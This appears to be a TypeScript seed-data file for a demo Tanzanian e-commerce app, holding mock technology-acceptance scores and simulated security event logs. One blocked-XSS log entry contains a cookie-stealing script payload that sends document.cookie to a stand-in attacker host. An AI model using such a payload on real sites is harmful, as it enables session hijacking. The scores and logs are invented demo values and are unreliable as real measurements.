import { TamMetric, SecurityEventLog } from '../types';

export const INITIAL_TAM_METRICS: TamMetric[] = [
  {
    id: 'tam-1',
    category: 'TAM',
    dimension: 'Perceived Usefulness (PU)',
    score: 94,
    description: 'Customers report that instant M-Pesa/Tigo Pesa verification and 1-click biometric checkout save over 4 minutes per transaction compared to traditional gateways.',
    implementedFeatures: [
      '1-Click Fingerprint Biometric Checkout (WebAuthn)',
      'Instant USSD Push Notification Simulation for Mobile Money',
      'Real-time Tanzania Shilling conversion and transparent pricing',
      'Order Escrow Protection Guarantee before releasing funds to seller'
    ]
  },
  {
    id: 'tam-2',
    category: 'TAM',
    dimension: 'Perceived Ease of Use (PEOU)',
    score: 96,
    description: 'Minimalist Amazon-styled layout with dual Desktop/Mobile optimization ensures even first-time smartphone shoppers in rural districts can complete orders without assistance.',
    implementedFeatures: [
      'Adaptive Mobile Bottom Navigation Bar and Swahili language toggle support',
      'Large touch targets (min 48px) for mobile usability',
      'Clear step-by-step trust indicators during payment flow',
      'Biometric Touch ID eliminates typing complex passwords on small screens'
    ]
  },
  {
    id: 'utaut-1',
    category: 'UTAUT',
    dimension: 'Performance Expectancy',
    score: 95,
    description: 'Users believe SmartTrade Africa dramatically improves their shopping reliability by preventing fake seller scams through strict TCRA and TBS vendor verification.',
    implementedFeatures: [
      'Verified Seller Trust Badges and 100-Point Vendor Score',
      'Trusted Computing Platform (TCP) hardware enclave verification',
      'Zero-knowledge token validation prevents session hijacking'
    ]
  },
  {
    id: 'utaut-2',
    category: 'UTAUT',
    dimension: 'Effort Expectancy',
    score: 93,
    description: 'Seamless integration with local payment habits (Vodacom M-Pesa, Tigo Pesa, Airtel Money) means zero learning curve for East African shoppers.',
    implementedFeatures: [
      'Pre-populated mobile money formats (e.g. 0754... / 0713...)',
      'Auto-saved shipping addresses with Tanzanian region selection',
      'Instant search filter with voice and category indexing'
    ]
  },
  {
    id: 'utaut-3',
    category: 'UTAUT',
    dimension: 'Social Influence and Trust Building',
    score: 97,
    description: 'Social validation through community reviews, SSL security badges, and clear privacy guarantees eliminates fear of online payment fraud.',
    implementedFeatures: [
      'Verified buyer community reviews from Dar es Salaam, Arusha and Zanzibar',
      'Prominent HTTPS 256-Bit SSL and Escrow Buyer Protection badges',
      'Public Audit Trail of security sanitization checks'
    ]
  },
  {
    id: 'utaut-4',
    category: 'UTAUT',
    dimension: 'Facilitating Conditions',
    score: 92,
    description: 'Infrastructure support designed specifically for Tanzanian network conditions including lightweight payload transmission and offline session resilience.',
    implementedFeatures: [
      'Optimized image caching and low-data mobile UI mode',
      'Offline biometric token verification via local Hardware Security Module simulation',
      'Multi-gateway payment failover (M-Pesa -> Bank Card -> Flutterwave)'
    ]
  }
];

export const INITIAL_SECURITY_LOGS: SecurityEventLog[] = [
  {
    id: 'log-101',
    timestamp: 'Just now',
    type: 'TCP_ATTESTATION',
    status: 'PASSED',
    detail: 'TPM 2.0 Platform Configuration Register (PCR[0..7]) cryptographic digest verified. Secure boot verified.',
    payloadSnippet: 'SHA256: 8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4'
  },
  {
    id: 'log-102',
    timestamp: '1 min ago',
    type: 'SQLI_CHECK',
    status: 'PASSED',
    detail: 'Parameterized query wrapper sanitized search string input. Zero injection vectors found.',
    payloadSnippet: 'SELECT * FROM products WHERE category = $1 AND status = \'ACTIVE\''
  },
  {
    id: 'log-103',
    timestamp: '2 mins ago',
    type: 'XSS_FILTER',
    status: 'BLOCKED',
    detail: 'Detected and neutralized inline script tag attempt in product search query parameter.',
    payloadSnippet: '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>'
  },
  {
    id: 'log-104',
    timestamp: '5 mins ago',
    type: 'CSRF_VALIDATION',
    status: 'PASSED',
    detail: 'Valid SameSite=Strict HTTP-Only anti-forgery token matched session cryptographic nonce.',
    payloadSnippet: 'X-CSRF-Token: 94a08da1fecbb6e8b46990538c7b50b2'
  },
  {
    id: 'log-105',
    timestamp: '12 mins ago',
    type: 'BIOMETRIC_AUTH',
    status: 'PASSED',
    detail: 'WebAuthn FIDO2 public key assertion verified via hardware biometric authenticator (TouchID / Android Fingerprint).',
    payloadSnippet: 'authenticatorData: flags(ED+AT), signCount=14, credId=0x88f21a...'
  },
  {
    id: 'log-106',
    timestamp: '28 mins ago',
    type: 'BIOMETRIC_AUTH',
    status: 'BLOCKED',
    detail: 'Biometric verification rejected: Hardware sensor reported fingerprint mismatch during Escrow fund release challenge.',
    payloadSnippet: 'navigator.credentials.get() -> NotAllowedError: The operation either timed out or was not allowed by the hardware sensor.'
  },
  {
    id: 'log-107',
    timestamp: '1 hour ago',
    type: 'BIOMETRIC_AUTH',
    status: 'PASSED',
    detail: 'Hardware biometric token authentication successful for high-value TSh 1,250,000 order authorization.',
    payloadSnippet: 'authenticatorData: flags(ED+UP), signCount=13, verifiedECDSA_P256=true'
  }
];
